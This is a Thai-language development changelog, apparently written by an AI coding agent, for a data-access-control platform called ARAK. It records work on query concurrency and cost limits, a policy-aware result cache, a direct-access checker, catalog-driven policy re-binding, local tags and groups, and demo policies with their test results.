- เกินเพดานของ engine → ไม่ยิง · `403` แบบ `fixable` (เป็นเรื่องของ statement ไม่ใช่สิทธิ์ → ปุ่ม Fix with AI ใช้ได้) · ลง audit `REJECTED` "The source's planner estimates this statement at a cost of …" → หมวด **TOO_COSTLY**
- เพดาน default: PostgreSQL 10,000,000 · SQL Server 5,000 — **คนละหน่วยกัน** (หน่วยของ planner แต่ละ engine) จึงตั้งแยก engine · engine อื่นยังไม่ประเมิน
- **fail-open** เมื่อถาม planner ไม่ได้ (ไม่มีสิทธิ์ SHOWPLAN · EXPLAIN error · engine อื่น) — statement ยังวิ่ง แต่ log เหตุผลครั้งเดียวต่อเหตุผล (ไม่เก็บลง stats เพราะอาจมีชื่อ object) · **fail-closed** อย่างเดียวคือปิด SHOWPLAN ไม่ได้ (connection จะคืนแผนแทนข้อมูล)
- พิสูจน์บน engine จริง: `CostEstimateIT` 5 (postgres:16 · 50k แถว — lookup ถูก / cross join แพงกว่า 10,000 เท่า · row cap ลดราคา `SELECT *` · CTE + LIMIT ในตัว + comment ท้าย · planner error แล้ว connection ยังใช้ได้) · `CostEstimateSqlServerIT` 4 (MSSQL 2022 — ROWCOUNT ลดราคาจริง · SHOWPLAN ถูกปิดหลังถาม · user ที่ไม่มีสิทธิ์ SHOWPLAN ได้ unpriced และ ROWCOUNT ถูก reset)

### BZ.3 API + config
- ผลของ `POST /api/v1/query` มี `estimatedCost` (null = ไม่ได้ประเมิน · hit จาก cache ได้ค่าเดิมของ read นั้น)
- `GET /api/v1/system/query-limits` (ต้อง login) → concurrency (running / waiting / admitted / queued / throttled + throttledBy ต่อชั้น) + cost (priced / unpriced / refused / highestAdmitted / lastRefusedEstimate)
- `queryLimits:` ใน `conf/dac.yml` — `QUERY_LIMITS_ENABLED` · `QUERY_MAX_CONCURRENT` · `QUERY_MAX_PER_SOURCE` · `QUERY_MAX_PER_CALLER` · `QUERY_QUEUE_WAIT_MS` · `QUERY_COST_GUARD_ENABLED` · `QUERY_MAX_COST_POSTGRES` · `QUERY_MAX_COST_SQLSERVER`
- test: `QueryAdmissionTest` 8 · `QueryCostGuardTest` 6 · `QueryRefusalsTest` +4 · `QueryLimitsIT` 6 (postgres:16 — ส่งเพดานของ engine · เกินราคา = fixable + TOO_COSTLY · เต็ม = ไม่ยิงเลย + BUSY แล้วคนอื่นยังผ่าน · คิด slot กับคนส่ง · cache hit / policy deny ไม่กิน slot) · unit รวม 557 ผ่าน

### BZ.4 หน้าจอ
- Query console: ถูกปฏิเสธเพราะไม่ว่าง → กล่อง **Busy — not run** (ไม่ใช่กล่อง Refused) บอกว่าไม่มีอะไรไปถึง source และไม่ใช่เรื่องสิทธิ์ · ปุ่ม **Try again in Ns** นับถอยหลังตาม `Retry-After` แล้วกดยิงซ้ำได้
- Job details: แถว **Planner estimate** — ค่าที่ planner ประเมิน (หน่วยของ planner source นั้น) หรือ "not priced"
- Audit → Refusals: หมวดใหม่ **Too expensive to run** · **Too busy, not run**
- `BusyNote.test.tsx` 2 · `query.test.ts` 6 · jest รวม 656 ผ่าน

### BZ.5 ที่ยังไม่ทำ (ตั้งใจ)
- เพดานต่อ instance ไม่ใช่ทั้ง cluster — ถ้าวันหนึ่ง scale ออกจะต้องย้ายตัวนับไป DB/Redis
- REST ต่อ table แบบ data service ของ Denodo — ยังค้างจาก BY.4

## รอบก่อนหน้า — **ข้อ BY: Result cache ของ Query API (FR-6.3 · M7 ครบ)**

SQL เดิมที่ถูกยิงซ้ำภายในไม่กี่วินาที (Query console กด Run ซ้ำ · dashboard refresh · BI DirectQuery ในอนาคต) ไม่ต้องไปถาม source ทุกครั้ง — แต่ policy ยังตัดสินและลง audit ทุกครั้งเหมือนเดิม

### BY.1 ทำไมใช้ร่วมกันข้ามคนได้โดยไม่รั่ว (`QueryResultCache` ใน `dac-service/policy`)
- **key = SQL หลัง rewrite** (projection + mask + ค่า RLS อยู่ใน statement แล้ว) + source id / engine / host / port / database / credentialRef / `updated_at` ของ source + row cap → คนสองคนได้ผลเดียวกันก็ต่อเมื่อ statement ที่บังคับ policy แล้วเหมือนกันทุกตัวอักษร ซึ่งแปลว่า source จะตอบเหมือนกันอยู่แล้ว (proxy ต่อด้วย service account ไม่ตั้ง session identity)
- lookup เกิด **หลัง** rewrite → deny ถูก throw ก่อนถึง cache เสมอ · decision ยังถูกคำนวณและเขียน `audit_decision` ทุกครั้ง
- ไม่ cache statement ที่คำตอบขึ้นกับเวลา/สุ่ม/session: `now()` `current_timestamp` `current_date` `random()` `NEWID()` `GETDATE()` `age(` `TABLESAMPLE` `'now'` `@@…` `nextval(` · `current_user` `session_user` `current_setting(` `SESSION_CONTEXT(` `SUSER_SNAME(` … (ชื่อ column อย่าง `user_name` `age` ไม่โดน — ต้องตามด้วย `(`)
- ขอบเขตหน่วยความจำ: 500 statement · 1,000,000 cell (row × column) · ผลเดียวเกิน ¼ ของ budget ไม่เก็บ · TTL 30 วินาที · LRU · rows ถูก freeze เป็น unmodifiable (null อยู่รอด)
- flush ทั้งหมดเมื่อ policy / binding / identity / enforcement / OM sync / grant / local tag เปลี่ยน (listener เดียวกับ decision cache) · read ที่ออกไปก่อน flush แล้วกลับมาหลัง flush ไม่ถูกเก็บ (generation)
- process เดียว (in-memory) — ถ้า scale หลาย instance แต่ละตัวมี cache ของตัวเอง ไม่มีผลเรื่องความถูกต้อง
- config `resultCache:` ใน `conf/dac.yml` — `RESULT_CACHE_ENABLED` · `RESULT_CACHE_MAX_ENTRIES` · `RESULT_CACHE_MAX_CELLS` · `RESULT_CACHE_TTL_SECONDS`

### BY.2 API
- `POST /api/v1/query` รับ `fresh: true` = อ่าน source ใหม่ (และแทนผลเดิมใน cache) · ผลลัพธ์มี `cached` + `readAt` (เวลาที่ source ถูกอ่านจริง)
- `GET /api/v1/system/result-cache` (ต้อง login) → entries / cells / hits / misses / stale / evictions / invalidations / lapped / uncacheable / oversized / เหตุผล flush ล่าสุด
- **V38** `audit_query.served_from_cache` — hit ยังเป็น `EXECUTED` แต่ติดว่า source ไม่มี record ของ read นี้ (auditor ที่ reconcile กับ log ของ source ต้องรู้) · `duration_ms` ของ hit = เวลาที่คนเรียกรอจริง
- test: `QueryResultCacheTest` 14 · `QueryResultCacheIT` 7 (postgres:16 — ซ้ำไม่ยิง source · fresh ยิง · คนละ RLS ไม่ใช้ผลร่วม · RLS เดียวกันใช้ร่วม · deny ยัง deny · row cap / TTL / flush / แก้ source = miss · audit false/true)

### BY.3 หน้าจอ
- Query console: ผลจาก cache ขึ้นป้าย **from cache · read Ns ago** + ปุ่ม **Run fresh** · Job details บอก "Read from the result cache — the source was read at …"
- Audit → Query log: แถวที่ตอบจาก cache มีป้าย **from cache**
- `CachedNote.test.tsx` 3 · `QueryLogPage.test.tsx` +1

### BY.4 ที่ยังไม่ทำ (ตั้งใจ)
- concurrency limit / cost guard ของ FR-6.3 — ✅ ทำแล้วในข้อ BZ
- REST ต่อ table แบบ data service ของ Denodo (`GET /data/{table}?branch=…`) — ผู้ใช้ถาม 2026-09-27 · ถ้าทำให้เป็นชั้นบางที่สร้าง `SELECT` แล้วส่งเข้า `/v1/query` เดิม (enforcement จุดเดียว)

## รอบก่อนหน้า — **ข้อ BX: ตัวตรวจคนที่อ่าน table ได้โดยไม่ผ่าน ARAK (FR-6.3.1 · M7)**

proxy / secure view กันได้เฉพาะคนที่ยอมผ่าน ARAK — ใครมี login ของตัวเองที่ SELECT table ได้ก็อ้อมทุก policy ได้ รอบนี้ ARAK ถามจาก source เองว่ามีใครบ้าง

### BX.1 อ่านจาก source (`DirectAccessReader` ใน `dac-connector-source`)
- อ่าน permission catalog อย่างเดียว ไม่แตะข้อมูลใน table · ไม่เปลี่ยนสิทธิ์อะไร
- **PG:** owner · GRANT บน table · GRANT ระดับ column (`COLUMN`) · `PUBLIC` · superuser · สมาชิก `pg_read_all_data` · นับเฉพาะคนที่มี USAGE บน schema (PUBLIC ต้องได้ USAGE จาก nspacl) · เทียบชื่อแบบไม่สนตัวพิมพ์
- **MSSQL:** SELECT / CONTROL ที่ state G/W บน object (`GRANT` / `COLUMN`) · schema (`SCHEMA`) · database · สมาชิก `db_datareader` / `db_owner` (`ROLE ...`) · owner ของ object หรือ schema · sysadmin login (`SYSADMIN`) · ตัด `sys` / `INFORMATION_SCHEMA` และคนที่โดน DENY SELECT ตรงบน object/schema
- role ที่ไม่ใช่ login → กางสมาชิกที่เป็น login แบบ recursive (สูงสุด 50 + นับที่เหลือ) · login ของ ARAK เอง (`current_user` / `USER_NAME()` / `SUSER_SNAME()`) ติด `self`
- IT: `DirectAccessReaderIT` 6 (postgres:16) · `DirectAccessReaderSqlServerIT` 3 (mssql 2022)

### BX.2 ตัดสิน (`DirectAccessService` + `DirectAccessResource`)
- `POST /api/v1/direct-access/check {assetFqn}` → ต้องเป็นคนดูแล table (`Stewardship.oversees`) หรือ auditor / admin — ไม่ใช่ → 403 · FQN ว่าง → 400 · ไม่รู้จัก → 404
- guarded = mode `PROXY` / `SECURE_VIEW` หรือมี secure view ติดตั้งอยู่บน table นี้
- `EXPOSED` guarded + มีคนอื่นนอกจาก ARAK · `CLOSED` เหลือแต่ ARAK · `OPEN` mode `NATIVE_CONFIG` / `NONE` (อ่านตรงเป็นเรื่องปกติ รายชื่อเป็นข้อมูล) · `NOT_FOUND` source ไม่มี table ตามที่ catalog บอก
- ทุกครั้งเขียน `audit_enforcement` — **V37** เพิ่ม mode `NONE` · action `DIRECT_ACCESS_CHECK` · outcome `CHECKED` · credential resolve ไม่ได้ → `REFUSED` (422) · source พัง → `FAILED` (502) · หน้า `/enforcement` → History แสดงเป็น "Direct access check"
- test: `DirectAccessServiceTest` 8 · `StewardshipGuardsTest.DirectAccess` 2

### BX.3 หน้าจอ
- tab Access ของ table → panel **Outside ARAK** ใต้ "Who can read this now" · กด *Check at the source* (ไม่รันเองตอนเปิดหน้า เพราะเปิด connection ไป source และลง audit)
- แต่ละแถว: Role/Login · ทางที่ได้สิทธิ์ · `Bypasses ARAK` (เมื่อ guarded) / `ARAK itself` · role แสดง login ที่สืบทอด · PUBLIC = "Every login on the database."
- `DirectAccessPanel.test.tsx` 5 · `EnforcementPage.test.tsx` +1

### BX.4 ที่ยังไม่ทำ (ตั้งใจ)
- ARAK **ไม่ REVOKE ให้เอง** — แก้สิทธิ์ที่ source เป็นเรื่องของ DBA (และ role ของ PG เป็น cluster-wide)
- ไม่ได้รันบน prod กับ source จริงของทีม เพราะ cluster ใช้ร่วมกับแอปอื่น — ให้ผู้ดูแลกดเองจาก tab Access
- ยังไม่มีการตรวจตามรอบ / แจ้งเตือนเมื่อผลเปลี่ยน · ยังไม่ขึ้น Dashboard "Needs attention"

## รอบก่อนหน้า — **ข้อ BW: change จาก OpenMetadata (webhook / poller) re-resolve `policy_binding` ทันที (FR-3.1.6)**

ก่อนหน้านี้ webhook กับ poller เขียน cache (asset / facet) แต่ไม่แตะ `policy_binding` → table ที่เพิ่งติด `PII.Sensitive` ใน OM ยังไม่ถูก policy "mask PII" ครอบ จนกว่า nightly reconcile หรือจะมีคนกด re-resolve

### BW.1 ทำอะไร
- `CatalogChangeApplier` (จุดเดียวที่ทั้ง webhook และ poller มาจบ) รับ `Bindings` hook → หลัง apply:
  - asset เปลี่ยน / ถูกลบ → หา table/view **ที่ FQN นั้นหรือใต้มัน** (เทียบทีละ segment · รวมตัวที่เพิ่งถูก retire เพื่อถอด binding) → `materializer.refresh(tables)` ทีละ 500
  - governance re-read สำเร็จ → `materializer.materializeAll()` (classification ถูกปิด / term ย้าย parent กระทบได้ทุกที่)
  - re-resolve พัง → นับเป็น `failed` → poller ถือ cursor ไว้ · webhook ตอบ 500 ให้ OM ส่งซ้ำ (apply ซ้ำฟรี)
- `Outcome` มี `rebound` (binding ที่เพิ่ม+ถอด) · webhook response มี `"rebound"`
- `DacApplication` สร้าง materializer ก่อน applier แล้วส่ง hook เข้าไป · decision cache ล้างเองผ่าน `materializer.changes()` เหมือนเดิม
- test: `CatalogChangeBindingsIT` (4) — tag ใหม่ → bind ทันที · ลบ schema → ถอด table ใต้มันแต่ไม่แตะ `SalesDBArchive` · segment match · re-resolve พัง → failed

### BW.2 poller ไม่ apply ช่วง overlap ซ้ำ
- เจอบน prod หลัง deploy: cursor ย้อน 1 นาที (OVERLAP) กัน event หลุด → พอ OM เงียบ poller ดึง 7 event เดิมมา refresh ซ้ำ **ทุกนาทีหลายชั่วโมง** (re-read OM 7 ครั้ง + re-bind ทุกนาที)
- `ChangeEventPoller` จำ `CatalogChange` ที่ apply สำเร็จแล้วใน overlap (in-memory · ทิ้งตัวที่เก่ากว่า cursor − overlap) → tick ถัดไปส่งเฉพาะตัวใหม่ให้ applier · ไม่มีอะไรใหม่ = เดิน cursor แล้วจบเงียบ
- ยังย้อน cursor เหมือนเดิม (ไม่ลดความปลอดภัย) · apply พัง = ไม่จำ → tick ถัดไป apply ซ้ำ · restart = apply overlap อีกรอบเดียว
- test: `ChangeEventPollerTest` +3 (feed เงียบไม่ apply ซ้ำ · มีตัวใหม่ใน window ส่งเฉพาะตัวใหม่ · พังแล้ว apply ซ้ำ)

## รอบก่อนหน้า — **ข้อ BV: tab Access ของ table เห็นเฉพาะผู้ดูแล · "How access is decided" วาดแบบ canvas**

ผู้ใช้สั่ง 2026-09-27: *"Tab Access ใน Catalog ของ Table ไม่ให้ user ทั่วไปเห็น ให้เฉพาะคนทำ policy กับ Admin นะ"* · และ Diagram แบบ layer *"ดูอ่านยาก"* อยากได้แบบเดียวกับ Diagram ของหน้า policy

### BV.1 สิทธิ์
- `GET /v1/access/assets/{fqn}` กับ `GET /v1/access/history/{fqn}` → 403 ถ้าไม่ใช่ `Stewardship.oversees` (admin · policy author · data owner ของ scope นั้น · auditor) · `/v1/access/mine` ยังเปิดให้ทุกคน
- หน้า table ซ่อน tab **Access** และ **Audit** จากคนอื่น · ลิงก์ `?tab=access` เปิด Overview แทน · frontend `oversees()` ใน `auth/stewardship.ts`
- data owner กับ auditor รวมอยู่ด้วย (owner ต้องใช้ tab นี้ grant/revoke, auditor ต้องตรวจ) — **ผู้ใช้ยืนยัน 2026-09-27: "ให้ data owner auditor เห็นด้วย"** · ถ้าวันหน้าจะตัดออกแก้ `Stewardship.oversees` กับ `oversees()` ที่เดียว
- test: `StewardshipGuardsTest.WhoCanReach` (3) · `AssetDetailPage.test.tsx` (6 ใหม่)

### BV.2 Diagram
- `accessDiagram.tsx` สร้าง node/edge ให้ `FlowDiagram` จาก `accessFlow()` ตัวเดิม: Read requested → Deny (รวมเป็น node เดียว) → หนึ่ง node ต่อ layer ที่มี allow (หรือ Direct grants) → What they see (data policy ทั้งหมด) → They read it in full / narrowed · ทุกทาง "ไม่ผ่าน" ลงเส้นประไปที่ **Denied** ด้านล่าง
- คลิก node → แสดง step เต็มด้านล่าง (ลิงก์ policy + Yes/No) · Diagram เป็นค่าเริ่มต้น, Flowchart ยังอยู่ · มุมมอง layer grid เดิมเอาออก (`diagram()`/`layers` ใน accessFlow ลบแล้ว)

## รอบก่อนหน้า — **ข้อ BU: ติด tag เองใน ARAK (FR-1.7) · ตัวอย่าง group บน prod**

ผู้ใช้อนุญาต *"ติด tag Arak เองก่อนได้"* (ไม่เขียนกลับเข้า OM ของทีม) · แล้วถาม *"ยังไม่เห็นมีตัวอย่าง group ใน Production เลย"*

### BU.1 Local tag — backend
- `V36__local_tags.sql`: `local_tag` (target_fqn = table หรือ column · asset_fqn · tag_fqn · reason บังคับ · UNIQUE(target, tag)) + `audit_local_tag` append-only
- vocabulary ยังเป็นของ OM: ติดได้เฉพาะ tag ที่ governance crawl ดึงมาแล้ว · tag/classification ที่ disabled ไม่ได้ · classification แบบ mutuallyExclusive ติดได้ตัวเดียว
- `LocalTagStore` เขียน `asset_facet` แถว provenance `local` ใหม่ทุกครั้งที่ facet ของ asset ถูกเขียน (`AssetStore` เรียก rederive) -> crawl / webhook / reconcile **ไม่ลบ local tag**
- `LocalTagResource` `/v1/local-tags`: GET `?asset=` (คืน `canEdit`) · POST ติด · POST `/remove` ถอด (ต้องมีเหตุผล จึงไม่ใช้ DELETE) · สิทธิ์ = `Stewardship.governs` (เท่ากับสิทธิ์ grant เพราะ tag ทำให้ column ถูก mask ได้) · 409 ถ้าติดซ้ำ · หลังเปลี่ยน `materializer.refresh` table นั้นทันที + invalidate decision cache
- IT `LocalTagStoreIT`

### BU.2 Local tag — frontend
- `LocalTags.tsx` `LocalTagControl`: ปุ่ม "Edit tags" ที่แผง Governance ของ table/view และทุกแถว column · เห็นเฉพาะคนที่ govern table · เลือก tag ตาม classification (`choices` ตัดตัวที่ติดแล้ว / disabled / mutuallyExclusive) · reason บังคับทั้งติดและถอด · error ขึ้น `role=alert`
- chip ที่มาจาก ARAK มีป้าย `ARAK` + tooltip "set in ARAK, not in OpenMetadata"
- ผ่าน: tsc · jest 64 suites / 630 tests · local HTTP smoke (`lt-smoke.mjs` ใน scratchpad) · screenshot ติด -> chip -> ถอด

### BU.3 ตัวอย่าง group บน prod (`prod-demo-groups.mjs` ใน scratchpad, รันซ้ำได้ ไม่ลบอะไร)
- group: `demo-grp-po-analysts` (analyst1, analyst2, contractor + group ซ้อน `demo-grp-po-leads`) · `demo-grp-po-leads` (lead) · `demo-grp-po-viewers` (viewer1, viewer2) · user `demo_grp_*` tenant ARAK-DEMO · password สุ่ม ไม่ได้เก็บ
- policy `demo-po-S14-org-allow-group` (ORG ALLOW subject = group analysts) · `demo-po-D14-table-mask-for-group` (DATA, mask email เป็น CONSTANT ให้ group viewers) · grant ตาราง PO ให้ group viewers ทั้งกลุ่ม
- ผล 7/7: สมาชิกตรงเข้าได้ · สมาชิกผ่าน group ซ้อนเข้าได้ · contractor ใน group ยังโดน S2 DENY · viewer เข้าผ่าน grant ของ group · คนนอก group โดน default deny · mask D14 ถึงเฉพาะ viewers

### BU.4 ค้าง
- ปุ่ม push tag กลับเข้า OM (FR-1.7 ส่วนหลัง) — เขียนเข้า OM ของทีม ต้องให้ผู้ใช้อนุญาตก่อน

## รอบก่อนหน้า — **ข้อ BT: Local group สร้างและจัดสมาชิกได้ใน ARAK · Column description จาก OpenMetadata ขึ้นใน Query console · ชุด demo policy บน prod**

ผู้ใช้สั่ง *"เน้น Data Access เพิ่มนะ ทั้งแบบ grant ตรง กับ policy เอาให้ครบทุก Case อาจจะจากหลายๆ User, Group"* · *"ต้องเอา Column Description จาก Openmetadata มาด้วยสิ แก้ใน local ก่อนด้วย"* · *"ใน prd ยังไม่เห็นมี policy เลย บอกให้ทดสอบ policy ทุกแบบไงครบ"*

### BT.1 Migration — **V35 `local_groups`**
- ไม่เปลี่ยน storage เลย เพราะ `principal` รับแถว GROUP ที่ source `local` ได้อยู่แล้ว และ `group_member.source` ก็รับ `local` อยู่แล้ว สมาชิกที่เพิ่มใน ARAK จึงไม่ถูก sync ทับ และไม่ไปทับของที่ sync มา
- เปลี่ยนเฉพาะ CHECK ของ `audit_identity_change.action` ให้มี `ADD_MEMBER` / `REMOVE_MEMBER` · ชื่อสมาชิกเก็บใน `attr_value` โดยใช้ `attr_key = 'member'`

### BT.2 Backend (`IdentityAdminStore` · `PrincipalResource`)
- `POST /v1/principals` รับ `principalType: GROUP` ได้แล้ว group **ไม่มี password และไม่มี app role** เพราะไม่มีใคร sign in เป็น group และ role ที่ติดกับ group จะไม่มีผลกับใคร
- `POST /v1/principals/{id}/members` (body `{memberId, reason}`) และ `DELETE /v1/principals/{id}/members/{memberId}?reason=` · ใช้ได้เฉพาะ PLATFORM_ADMIN · **reason บังคับ** · แก้ได้เฉพาะ group ที่ source เป็น `local` (group จาก directory → 400 เพราะรอบ sync ถัดไปจะย้อนการแก้) · ห้ามใส่ group เป็นสมาชิกของตัวเองหรือทำให้เกิดวงวน · เพิ่มซ้ำหรือลบคนที่ไม่ได้อยู่ใน group → `changed: false` ไม่เขียน audit
- ทดสอบด้วย `IdentityAdminStoreIT` LocalGroups 9/9 (Testcontainers)

### BT.3 Frontend
- `PrincipalDetailPage` เพิ่ม `MemberEditor` สำหรับ local group เมื่อผู้ใช้เป็น admin: ค้นหาและเพิ่มสมาชิก / เอาสมาชิกออก ต้องกรอก Why ทั้งตอนเข้าและตอนออก · group ที่ sync มาหรือผู้ใช้ที่ไม่ใช่ admin จะเห็นแบบอ่านอย่างเดียว
- `AppRolesPage` ในฟอร์มสร้าง account เลือก Group ได้ ช่อง password และ app role จะหายไป
- `SettingsPage` การ์ด Local groups ลิงก์ไปที่ `/principals?type=GROUP`
- `SchemaExplorer` (Query console) ชี้ที่ column แล้วเห็น description จาก OpenMetadata (`AssetMapperTest.keepsColumnDescriptions` ยืนยันว่า mapper เก็บ description ไว้)
- **ข้อสังเกต:** ตาราง demo บน prod ยังไม่มี column description ใน OpenMetadata เลย (0 จาก 217 column) pipeline กับ tooltip พร้อมแล้ว แต่ต้องมีคนไปเขียน description ใน OM ก่อน การเขียนลง OM ของทีมต้องได้ OK จากผู้ใช้ก่อน

### BT.4 ชุด demo policy บน prod (scratchpad `prod-demo-policies.mjs` ไม่ commit)
- ชื่อขึ้นต้นด้วย `demo-po-` รันซ้ำได้: หาเจอตามชื่อแล้วใช้ของเดิม **ไม่ archive / disable / ลบอะไรเลย** (เก็บไว้ demo)
- ผลรวม **29 policy + 26 demo user + grants + access requests ทุกสถานะ** ผ่าน **52/52** ข้อ (ข้าม P19 เพราะ owner ใน OM ไม่ใช่ principal ของ ARAK บน prod ซึ่งยังไม่มี identity sync · ข้าม Q0 เพราะ credential ของ source บน prod ยัง auth ไม่ผ่าน)
- Subscription: ABAC · DENY พร้อม exemption (ยังไม่หมดอายุ / หมดอายุแล้ว / ไม่มีวันหมดอายุ → 400) · time window · purpose · `principals.user` · `principals.role` · `assetOwner` · expression · ipCidr · validFrom/validTo · schema DENY · table DENY
- Data: RLS IN_LIST / ATTRIBUTE_COMPARE / ALWAYS_FALSE · mask NULLIFY / CONSTANT / HASH / PARTIAL / REGEX_REPLACE / ROUNDING (YEAR, bucket 100) · mask ตาม tag (Confirmed และ Suggested) · HIDE · cell mask · การปลด mask ที่ระดับ table โดย global ยินยอม (และกรณีที่ปลดไม่ได้เพราะ global ไม่ยินยอม)
- Lifecycle: DRAFT · PENDING_APPROVAL ที่ผู้เขียนอนุมัติเองไม่ได้ (403) แล้ว steward อนุมัติ · แก้ policy แล้วได้ version ใหม่
- Grant: ให้ตัวเอง 403 · ไม่มี reason 400 · ไม่ใช่ steward 403 · วันกลับหัว 400 · grant ผ่าน gate ได้เมื่อ global ยินยอม · grant ผ่าน DENY ที่ไม่ยินยอมไม่ได้ · amend แล้ว revoke (history เก็บครบ) · grant ล่วงหน้า
- Access request: อ่านได้อยู่แล้ว 409 · grant ไม่ช่วยเพราะติด DENY 409 · approve → start → complete (GRANT) · reject · approve แล้ว decline · withdraw · ค้างใน inbox · ผู้ขอตัดสินคำขอของตัวเอง 403

### BT.5 บทเรียนจาก demo (engine ถูกต้องตาม FR-5.1 แต่คนเขียน policy พลาดได้)
- **ALLOW ที่ระดับล่างกว่าและมี selector จะผ่อน gate ของ global ให้ทุกคนที่มัน match ทันทีที่ ALLOW ระดับ global ทุกตัวตั้ง `allowLocalOverride: true`** (ซึ่งต้องตั้งถ้าอยากให้ grant ผ่าน gate ได้) · demo รอบแรกมี schema ALLOW `tenant eq ARAK-DEMO` ผลคือทุกคนใน tenant เข้าตารางได้หมด แก้เป็น schema **DENY** `tenant ne ARAK-DEMO` (ออกเป็น version ใหม่) · `ne` / `notIn` เมื่อไม่มี attribute นั้นจะได้ **true** DENY จึงครอบคนที่ไม่มี tenant ด้วย
- การ "ให้คนคนเดียวเข้าที่ระดับ table" ต้องทำด้วย **grant** เพราะ policy ที่ไม่มี selector ถูก API ปฏิเสธ (มีแต่ grant ที่เป็น additive)
- ข้อความตอน refuse ของ gate เคยบอกว่า *"does not allow a lower layer to relax it"* กับ **ทุก** ALLOW ใน layer นั้น แม้ตัวที่ตั้ง override=true แล้วก็ตาม → **แก้แล้ว (BT.7)**

### BT.7 PolicyEngine — gate ชี้ชื่อ policy ที่ไม่ยินยอม · grant ไม่มีสิทธิ์ออกเสียงเรื่อง consent
- ตัวที่ **ยินยอม** แล้วแต่ยังติด จะได้ข้อความ *"it allows a lower layer to relax it, but `<ชื่อ policy>` at the same layer does not, so no direct grant can pass this layer"* ส่วนตัวที่ **ไม่ยินยอม** ได้ข้อความเดิม คนเขียน policy จึงรู้ว่าต้องไปแก้ตัวไหน ไม่ใช่ไปเปิด override ซ้ำที่ตัวเองแล้วงงว่าทำไมไม่มีอะไรเปลี่ยน
- `overridable(layer)` **ไม่นับ direct grant แล้ว** เพราะ grant (selector = null, `allowLocalOverride` = null) ที่ตกอยู่ใน layer เดียวกับ gate เคยถูกนับเป็นเสียง "ไม่ยินยอม" ผลคือ grant ของคนหนึ่งปิด layer ใส่อีกคนที่ผู้เขียน policy ยอมให้ผ่านแล้ว ซึ่งกลับหัวกับหลัก "grant เพิ่มสิทธิ์อย่างเดียว" · ใน service ตอนนี้ grant อยู่ที่ TABLE เสมอ (`GrantStore.GRANT_LAYER`) เคสนี้จึงยังไม่เกิดจริง แต่ engine ต้องไม่พึ่งเรื่องนั้น
- `SubscriptionPolicyTest.Gates`: `refusalNamesTheWithholdingPolicy` · `grantAtTheGateDoesNotWithholdConsent` (ลอง mutation เอา `c.additive()` ออกแล้ว test นี้ fail จริง)
- `PolicyEngine.java` เคยมี NUL byte ดิบ 6 ตัวใน char literal ของ `predicateKey` ทำให้ git/grep มองว่าเป็นไฟล์ binary (git เลยไม่ normalize line ending) เปลี่ยนเป็น `'\0'` แล้ว ค่าเท่าเดิมทุก byte · **diff รอบนี้ยาวทั้งไฟล์เพราะ git normalize CRLF → LF ครั้งเดียว** ไม่ใช่การแก้ logic
- ผ่าน: engine 285 · unit ทั้ง backend 1,112 · `GrantCompositionIT` 19/19

### BT.8 Query console — ข้อความตอนถูกปฏิเสธชี้ policy ที่เป็นเหตุจริง (UAT C39b)
- เจอใน UAT: คน Finance query ตอน 20:00 ได้ข้อความ *"S1 (procurement/audit) did not apply: attribute condition not satisfied"* ซึ่งจริงแต่ไม่ช่วยอะไร ตัวที่ปิดประตูจริงคือ S4 ที่เขียนให้ Finance แต่ติด office hours
- `QueryRewriter.reasonFor` เลือกตัวที่จะโทษตามลำดับนี้: DENY ที่ match → ALLOW ที่ **ยืนอยู่ใน gate ที่ปฏิเสธ** (reason ที่ขึ้นต้นด้วย `PolicyEngine.HOLDS_THE_GATE`) → ในกลุ่มนั้นเลือกตัวที่ **เกือบผ่าน** ก่อน (`SubjectMatcher.nearMiss` คือผ่าน identity/attribute/expression แล้ว ติดแค่ time window หรือ context) → ถ้าไม่มีข้อมูล gate ใช้กติกาเดียวกันกับ ALLOW ที่ไม่ match ทั้งหมด → composition
- ไม่โทษอีกต่อไป: DENY ที่ **ไม่** match (มันไม่ได้กันใคร) · policy ที่อยู่ใน layer ที่ผู้ใช้ผ่านมาแล้ว · data policy (เหมือนเดิม)
- `SubjectMatcher.OUTSIDE_TIME_WINDOW` / `OUTSIDE_CONTEXT` และ `PolicyEngine.HOLDS_THE_GATE` เป็นค่าคงที่ public แล้ว ข้อความเดิมทุก byte
- `QueryRewriterTest` เพิ่ม 3 ข้อ (2 ข้อใช้ `PolicyEngine` จริง) · ลอง mutation ถอดทั้ง 3 กติกาแล้ว fail ครบ 3 ข้อ
- ผ่าน: unit ทั้ง backend 1,115 (engine 285 · proxy 37 · service 594)

### BT.9 กติกา "โทษใคร" ใช้ชุดเดียวกันทั้ง Query console และหน้าคำขอสิทธิ์
- `AccessEligibility.blocking` (ข้อความ *"ถ้าได้สิทธิ์แล้วยังติดอะไร"* บนหน้า Ask for access และ `blockedBy` / `blockedByPolicyId` บนหน้า Review) เคยเลือก **ALLOW ตัวแรกที่ไม่ match** จึงโทษได้ทั้ง DENY ที่ไม่ match · data policy · policy ใน layer ที่ผ่านแล้ว เป็นบั๊กเดียวกับ BT.8
- ย้ายกติกาไปไว้ที่ `dac-engine` คลาสใหม่ `Refusals.blame(decision)` ทั้ง `QueryRewriter.reasonFor` และ `AccessEligibility.blocking` เรียกตัวนี้ สองหน้าจะไม่มีวันชี้ policy ต่างกันสำหรับการปฏิเสธครั้งเดียวกัน
- ลำดับ: DENY ที่ match → ALLOW ใน gate ที่ปฏิเสธ (เกือบผ่านก่อน แล้วตัวที่มีคำอธิบาย แล้วตัวแรก) → ALLOW อื่นที่ไม่ match ด้วยกติกาเดียวกัน → reason `HOLDS_THE_GATE` เอง → บรรทัดของ engine (`(composition)` / `(none)`) · ข้ามเสมอ: DENY ที่ไม่ match · data policy · `grant:*`
- `RefusalsTest` 8 ข้อ (5 ข้อเขียน reason เอง · 3 ข้อใช้ engine จริง รวมกรณีมี grant ที่ TABLE แล้วติด gate ของ ORG)
- ผ่าน: unit ทั้ง backend 1,123 (engine 293) · IT `AccessRequestIT` + `PolicyOverviewIT` + `GrantCompositionIT` 122/122

### BT.11 Footer เหลือแค่ลิขสิทธิ์ · ชื่อคนทำย้ายไป Settings → Credits
- ผู้ใช้สั่ง 2026-09-27: เอาชื่อออกจาก footer ใส่ *All rights reserved* แทน แล้วย้ายชื่อไปไว้ section ผู้จัดทำใน Settings
- `AppShell` footer: `© 2026 MFEC` / `All rights reserved` (tooltip `© 2026 MFEC. All rights reserved.`)
- `SettingsPage` section **Credits** ท้ายหน้า — ไม่ใช่ tile ไม่ลิงก์ไปไหน ทุก role เห็น · README ยังมีเครดิตเหมือนเดิม
